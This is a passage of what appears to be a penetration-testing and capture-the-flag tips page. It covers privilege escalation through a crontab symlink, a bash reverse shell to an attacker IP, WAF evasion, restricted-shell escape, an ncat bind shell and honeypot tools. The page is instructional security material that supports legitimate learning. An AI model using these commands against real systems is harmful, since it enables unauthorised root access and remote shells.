+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ramdump</span>
+</pre></div>
+</div>
+<p>If, you create a symlink from /tmp/ramdump to /etc/crontab</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ln</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ramdump</span>
+</pre></div>
+</div>
+<p>Now, when the ramdump is taken, lime will now dump the content of RAM straight into /etc/crontab. As crontab will ignore everything which doesn’t match the correct syntax. If the memory contains a injected string such as</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="n">cron</span><span class="o">.</span><span class="n">py</span>
+<span class="nb">print</span> <span class="s2">&quot;* * * * * root /bin/bash /home/username/evilscript&quot;</span>
+</pre></div>
+</div>
+<p>the injected string will end up in /etc/crontab will be executed.</p>
+<p>The contents of evilscript can be</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">IP</span><span class="o">/</span><span class="n">Port</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
+</pre></div>
+</div>
+<p>which will provide the root shell to the attacker. Thanks to TheColonial :)</p>
+</li>
+<li><p><a class="reference external" href="https://github.com/Arrexel/phpbash">phpbash</a> is a standalone, semi-interactive web shell. It’s main purpose is to assist in penetration tests where traditional reverse shells are not possible.</p></li>
+<li><p>ps aux not fully visible try</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;`ps aux --sort -rss`&quot;</span>
+</pre></div>
+</div>
+</li>
+<li><p>If there’s a XXE on a website and possible RFI using internal address i.e on <a class="reference external" href="http://127.0.0.1:80/home=RFI">http://127.0.0.1:80/home=RFI</a> rather than <a class="reference external" href="http://10.54.98.10:80/home=RFI">http://10.54.98.10:80/home=RFI</a>, utilize XXE to send the request with localaddress.</p></li>
+<li><p>If there’s a possible command execution on a website such as</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">curl</span> <span class="o">-</span><span class="n">A</span> <span class="s2">&quot;bitvijays&quot;</span> <span class="o">-</span><span class="n">i</span> <span class="s2">&quot;http://IPAddress/example?parameter=&#39;linux_command&#39;&quot;</span>
+</pre></div>
+</div>
+<p>However, it is protected by a WAF, probably, try bash globbling techniques with ? and *. Refer <a class="reference external" href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8">Web Application Firewall (WAF) Evasion Techniques</a> and <a class="reference external" href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0">Web Application Firewall (WAF) Evasion Techniques #2</a> ! Amazing stuff here!
+Also, it might be a good idea to test the command with ? on your local machine first then directly on the target. Also, sometimes, it adding a space before or after the linux_command might work like ‘ linux_command’ or ‘linux_command ‘</p>
+</li>
+<li><p>Similar to ls there is dir in linux. Try “dir -l” Might be helpful sometimes.</p></li>
+<li><p>Sometimes, we don’t have tools on the victim machine, in that case we can download static binaries from <a class="reference external" href="https://github.com/andrew-d/static-binaries">Static-Binaries</a> If not, found, try the deb or rpm package of the binary, extract it and upload.</p></li>
+<li><p>mysql can execute statements in one liner using –execute or -e option</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mysql</span> <span class="p">[</span><span class="n">options</span><span class="p">]</span> <span class="n">db_name</span>
+<span class="o">--</span><span class="n">user</span><span class="o">=</span><span class="n">user_name</span><span class="p">,</span> <span class="o">-</span><span class="n">u</span> <span class="n">user_name</span>  <span class="p">:</span> <span class="n">The</span> <span class="n">MariaDB</span> <span class="n">user</span> <span class="n">name</span> <span class="n">to</span> <span class="n">use</span> <span class="n">when</span> <span class="n">connecting</span> <span class="n">to</span> <span class="n">the</span> <span class="n">server</span><span class="o">.</span>
+<span class="o">--</span><span class="n">password</span><span class="p">[</span><span class="o">=</span><span class="n">password</span><span class="p">],</span> <span class="o">-</span><span class="n">p</span><span class="p">[</span><span class="n">password</span><span class="p">]</span> <span class="p">:</span> <span class="n">The</span> <span class="n">password</span> <span class="n">to</span> <span class="n">use</span> <span class="n">when</span> <span class="n">connecting</span> <span class="n">to</span> <span class="n">the</span> <span class="n">server</span><span class="o">.</span> <span class="n">If</span> <span class="n">you</span> <span class="n">use</span> <span class="n">the</span> <span class="n">short</span> <span class="n">option</span> <span class="n">form</span> <span class="p">(</span><span class="o">-</span><span class="n">p</span><span class="p">),</span> <span class="n">you</span> <span class="n">cannot</span> <span class="n">have</span> <span class="n">a</span> <span class="n">space</span> <span class="n">between</span> <span class="n">the</span> <span class="n">option</span> <span class="ow">and</span> <span class="n">the</span> <span class="n">password</span><span class="o">.</span> <span class="n">If</span> <span class="n">you</span> <span class="n">omit</span> <span class="n">the</span> <span class="n">password</span> <span class="n">value</span> <span class="n">following</span> <span class="n">the</span> <span class="o">--</span><span class="n">password</span> <span class="ow">or</span> <span class="o">-</span><span class="n">p</span> <span class="n">option</span> <span class="n">on</span> <span class="n">the</span> <span class="n">command</span> <span class="n">line</span><span class="p">,</span> <span class="n">mysql</span>
+        <span class="n">prompts</span> <span class="k">for</span> <span class="n">one</span><span class="o">.</span>
+<span class="o">--</span><span class="n">execute</span><span class="o">=</span><span class="n">statement</span><span class="p">,</span> <span class="o">-</span><span class="n">e</span> <span class="n">statement</span> <span class="p">:</span> <span class="n">Execute</span> <span class="n">the</span> <span class="n">statement</span> <span class="ow">and</span> <span class="n">quit</span><span class="o">.</span> <span class="n">Disables</span> <span class="o">--</span><span class="n">force</span> <span class="ow">and</span> <span class="n">history</span> <span class="n">file</span><span class="o">.</span> <span class="n">The</span> <span class="n">default</span> <span class="n">output</span> <span class="nb">format</span> <span class="ow">is</span> <span class="n">like</span> <span class="n">that</span> <span class="n">produced</span> <span class="k">with</span> <span class="o">--</span><span class="n">batch</span><span class="o">.</span>
+</pre></div>
+</div>
+</li>
+<li><p>If there’s .action file present in the URL on a Apache WebServer, <a class="reference external" href="https://svn.apache.org/repos/asf/struts/archive/trunk/struts-doc-1.1/api/org/apache/struts/action/package-summary.html">Apache Struts</a> might be installed on it. Check for Apache Struts vulnerabilities on it.</p></li>
+<li><p>Windows XP Machine ? and we are able to put some files anywhere? Refer <a class="reference external" href="http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html">Playing with MOF files on Windows, for fun &amp; profit</a></p></li>
+<li><p>Good Post Exploitation Guide <a class="reference external" href="http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf">Windows Post-Exploitation Command List</a></p></li>
+<li><p>Oracle Padding Attacks? Refer <a class="reference external" href="https://github.com/GDSSecurity/PadBuster">PadBuster</a></p></li>
+<li><p>If there’s a cron job with</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="n">php</span> <span class="o">/</span><span class="n">path</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">your</span><span class="o">-</span><span class="n">project</span><span class="o">/</span><span class="n">artisan</span> <span class="n">schedule</span><span class="p">:</span><span class="n">run</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
+</pre></div>
+</div>
+<p>possibly, we can edit schedule method of the AppConsoleKernel class (Kernel.php) in AppConsoleKernel and use exec method to execute commands on the operating systems.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$schedule-&gt;exec(&#39;node /home/forge/script.js&#39;)-&gt;daily();
+</pre></div>
+</div>
+<p>Refer <a class="reference external" href="https://laravel.com/docs/5.6/scheduling">Task Scheduling</a></p>
+</div></blockquote>
+<ul class="simple">
+<li><p>Handy Stuff</p></li>
+</ul>
+<blockquote>
+<div><ul class="simple">
+<li><p>Utilize xxd to convert hex to ascii</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">xxd</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">p</span>
+<span class="o">-</span><span class="n">p</span> <span class="o">|</span> <span class="o">-</span><span class="n">ps</span> <span class="o">|</span> <span class="o">-</span><span class="n">postscript</span> <span class="o">|</span> <span class="o">-</span><span class="n">plain</span> <span class="p">:</span> <span class="n">output</span> <span class="ow">in</span> <span class="n">postscript</span> <span class="n">continuous</span> <span class="n">hexdump</span> <span class="n">style</span><span class="o">.</span> <span class="n">Also</span> <span class="n">known</span> <span class="k">as</span> <span class="n">plain</span> <span class="n">hexdump</span> <span class="n">style</span><span class="o">.</span>
+<span class="o">-</span><span class="n">r</span> <span class="o">|</span> <span class="o">-</span><span class="n">revert</span> <span class="p">:</span> <span class="n">reverse</span> <span class="n">operation</span><span class="p">:</span> <span class="n">convert</span> <span class="p">(</span><span class="ow">or</span> <span class="n">patch</span><span class="p">)</span> <span class="n">hexdump</span> <span class="n">into</span> <span class="n">binary</span><span class="o">.</span>  <span class="n">If</span> <span class="ow">not</span> <span class="n">writing</span> <span class="n">to</span> <span class="n">stdout</span><span class="p">,</span> <span class="n">xxd</span> <span class="n">writes</span> <span class="n">into</span> <span class="n">its</span> <span class="n">output</span> <span class="n">file</span> <span class="n">without</span> <span class="n">truncating</span> <span class="n">it</span><span class="o">.</span> <span class="n">Use</span> <span class="n">the</span> <span class="n">combination</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">p</span> <span class="n">to</span> <span class="n">read</span> <span class="n">plain</span> <span class="n">hexadecimal</span> <span class="n">dumps</span> <span class="n">without</span> <span class="n">line</span> <span class="n">number</span> <span class="n">information</span> <span class="ow">and</span> <span class="n">without</span> <span class="n">a</span> <span class="n">particular</span> <span class="n">column</span> <span class="n">layout</span><span class="o">.</span> <span class="n">Additional</span> <span class="n">Whitespace</span> <span class="ow">and</span> <span class="n">line</span><span class="o">-</span><span class="n">breaks</span> <span class="n">are</span> <span class="n">allowed</span> <span class="n">anywhere</span><span class="o">.</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>We may use base64 -w 0 to disable line wrapping while encoding files with base64.</p></li>
+<li><p>Use python</p></li>
+</ul>
+<blockquote>
+<div><ul class="simple">
+<li><p>binascii.unhexlify(hexstr) to convert hex to string</p></li>
+<li><p>base64.decodestring(str) to decode base64 string</p></li>
+<li><p>Convert number to hex</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">hex</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
+<span class="s1">&#39;0xf&#39;</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>Convert hex to decimal</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">s</span> <span class="o">=</span> <span class="s2">&quot;6a48f82d8e828ce82b82&quot;</span>
+<span class="n">i</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>If we are able to execute python code maybe use popen to execute os commands.</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span><span class="p">;</span>
+<span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&quot;whoami&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</pre></div>
+</div>
+</div></blockquote>
+</div></blockquote>
+<ul class="simple">
+<li><p>Getting out of more</p></li>
+</ul>
+<blockquote>
+<div><p>If in somecase, we are unable to ssh into the machine or being logged out when trying ssh, check the /etc/passwd file for the shell defined for that user.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">user1</span>
+<span class="n">user1</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">11026</span><span class="p">:</span><span class="mi">11026</span><span class="p">:</span><span class="n">user</span> <span class="n">level</span> <span class="mi">1</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user1</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">showtext</span>
+</pre></div>
+</div>
+<p>Here Instead of /bin/bash, user1 is using /usr/bin/showtext, which is apparently not a shell. Let’s look at the content of the file</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">showtext</span>
+<span class="c1">#!/bin/sh</span>
+<span class="n">more</span> <span class="o">~/</span><span class="n">text</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">exit</span> <span class="mi">0</span>
+</pre></div>
+</div>
+<p>In such cases, First, minimize your terminal so that when we are logged into user1 via ssh command, the large text will force a “more” message to prompt us to continue the output. Now that we have forced the terminal to prompt us to continue the display via “more” or “–More–(50%)” in this case, press “v” to enter “vim”, a built-in text editor on Unix machines. Once, we have vim interface, use :shell to get a shell.</p>
+</div></blockquote>
+<ul class="simple">
+<li><p>List all the files together</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">find</span> <span class="o">/</span><span class="n">home</span> <span class="o">-</span><span class="nb">type</span> <span class="n">f</span> <span class="o">-</span><span class="n">printf</span> <span class="s2">&quot;</span><span class="si">%f</span><span class="se">\t</span><span class="s2">%p</span><span class="se">\t</span><span class="si">%u</span><span class="s2">\</span><span class="si">%g</span><span class="se">\t</span><span class="s2">%m</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">|</span> <span class="n">column</span> <span class="o">-</span><span class="n">t</span>
+</pre></div>
+</div>
+</div></blockquote>
+</div></blockquote>
+</section>
+<section id="wordpot">
+<h2>Wordpot<a class="headerlink" href="#wordpot" title="Link to this heading"></a></h2>
+<p><a class="reference external" href="https://github.com/gbrindisi/wordpot">Wordpot</a> : Wordpot is a Wordpress honeypot which detects probes for plugins, themes, timthumb and other common files used to fingerprint a wordpress installation.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>python /opt/wp/wordpot.py --host=$lanip --port=69 --title=Welcome to XXXXXXX Blog Beta --ver=1.0 --server=XXXXXXXWordpress
+</pre></div>
+</div>
+</section>
+<section id="fakesmtp">
+<h2>FakeSMTP<a class="headerlink" href="#fakesmtp" title="Link to this heading"></a></h2>
+<p><a class="reference external" href="http://nilhcem.com/FakeSMTP/">FakeSMTP</a> : FakeSMTP is a Free Fake SMTP Server with GUI for testing emails in applications easily.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">fakesmtp</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">fakeSMTP</span><span class="o">-</span><span class="mf">2.1</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">.</span><span class="n">jar</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">b</span> <span class="o">-</span><span class="n">p</span> <span class="mi">2525</span> <span class="mf">127.0.0.1</span> <span class="o">-</span><span class="n">o</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">username</span>
+</pre></div>
+</div>
+</section>
+<section id="rubberglue">
+<h2>Rubberglue<a class="headerlink" href="#rubberglue" title="Link to this heading"></a></h2>
+<p><a class="reference external" href="https://github.com/adhdproject/adhdproject.github.io/blob/master/Tools/Rubberglue.md">Rubberglue</a> : We can use Rubberglue to listen on a port such that any traffic it receives on that port it will forward back to the client ( attacker ) on the same port.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python2</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">honeyports</span><span class="o">/</span><span class="n">honeyports</span><span class="o">-</span><span class="mf">0.4</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">p</span> <span class="mi">23</span>
+</pre></div>
+</div>
+</section>
+<section id="knockd">
+<h2>Knockd<a class="headerlink" href="#knockd" title="Link to this heading"></a></h2>
+<p><a class="reference external" href="http://www.zeroflux.org/projects/knock">Knockd - Port-knocking server</a> : knockd is a port-knock server. It listens to all traffic on an ethernet (or PPP) interface, looking for special “knock” sequences of port-hits. A client makes these port-hits by sending a TCP (or UDP) packet to a port on the server. This port need not be open – since knockd listens at the link-layer level, it sees all traffic even if it’s destined for a closed port. When the server detects a specific sequence of port-hits, it runs a command defined in its configuration file. This can be used to open up holes in a firewall for quick access.</p>
+<p>If there is port knocking involved, read the /etc/knockd.conf, read the sequence port knock should be done and execute</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>for PORT in 43059 22435 17432; do nmap -PN 192.168.56.203 -p $PORT; done
+</pre></div>
+</div>
+</section>
+<section id="dcept">
+<h2>DCEPT<a class="headerlink" href="#dcept" title="Link to this heading"></a></h2>
+<p>SecureWorks researchers have created a solution known as <a class="reference external" href="https://www.secureworks.com/blog/dcept">DCEPT (Domain Controller Enticing Password Tripwire)</a> to detect network intrusions. Github is <a class="reference external" href="https://github.com/secureworks/dcept">dcept</a></p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/g0tmi1k/exe2hex">exe2hex</a> : Inline file transfer using in-built Windows tools (DEBUG.exe or PowerShell).</p></li>
+<li><p><a class="reference external" href="https://github.com/secabstraction/PowerCat">Powercat</a> : A PowerShell TCP/IP swiss army knife that works with Netcat &amp; Ncat</p></li>
+<li><p><a class="reference external" href="https://github.com/trustedsec/unicorn">Unicorn</a> is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory.</p></li>
+<li><p><a class="reference external" href="https://github.com/samratashok/nishang">Nishang</a> is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming.</p></li>
+<li><p><a class="reference external" href="https://nmap.org/book/ncat-man-examples.html">Ncat</a> Ncat is a feature-packed networking utility which reads and writes data across networks from the command line. Ncat was written for the Nmap Project and is the culmination of the currently splintered family of Netcat incarnations. It is designed to be a reliable back-end tool to instantly provide network connectivity to other applications and users. Ncat will not only work with IPv4 and IPv6 but provides the user with a virtually limitless number of potential uses.
+Among Ncat’s vast number of features there is the ability to chain Ncats together; redirection of TCP, UDP, and SCTP ports to other sites; SSL support; and proxy connections via SOCKS4, SOCKS5 or HTTP proxies (with optional proxy authentication as well). Some general principles apply to most applications and thus give you the capability of instantly adding networking support to software that would normally never support it.</p></li>
+</ul>
+<blockquote>
+<div><p>Few important example is</p>
+<p>Redirect any incoming traffic on TCP port 8080 on the local machine to host (example.org -in below example) on port 80.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ncat</span> <span class="o">--</span><span class="n">sh</span><span class="o">-</span><span class="n">exec</span> <span class="s2">&quot;ncat example.org 80&quot;</span> <span class="o">-</span><span class="n">l</span> <span class="mi">8080</span> <span class="o">--</span><span class="n">keep</span><span class="o">-</span><span class="nb">open</span>
+</pre></div>
+</div>
+<p>Bind to TCP port 8081 and attach /bin/bash for the world to access freely.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ncat</span> <span class="o">--</span><span class="n">exec</span> <span class="s2">&quot;/bin/bash&quot;</span> <span class="o">-</span><span class="n">l</span> <span class="mi">8081</span> <span class="o">--</span><span class="n">keep</span><span class="o">-</span><span class="nb">open</span><span class="s2">&quot;&quot;</span>
+</pre></div>
+</div>
+</div></blockquote>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="LFC-VM-P2-UnprivilegedToPrivilegedShell.html" class="btn btn-neutral float-left" title="Unprivileged Shell to Privileged Shell" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="LFC-VM-P4-Appendix.html" class="btn btn-neutral float-right" title="Appendix" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright Vijay Kumar &amp; Contributors.</p>
+  </div>
+
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(false);
+      });
+  </script> 
+
+</body>
+</html>
